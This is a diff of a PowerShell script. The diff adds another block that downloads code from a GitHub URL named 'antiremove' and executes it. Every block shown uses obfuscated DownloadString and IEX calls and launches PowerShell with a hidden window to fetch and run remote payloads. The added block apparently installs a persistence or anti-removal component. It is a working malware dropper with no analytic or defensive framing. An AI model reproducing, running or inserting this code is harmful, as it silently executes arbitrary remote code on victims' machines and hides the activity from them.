@@ -77,6 +77,10 @@ $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/Me
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/antiremove")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/ok.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
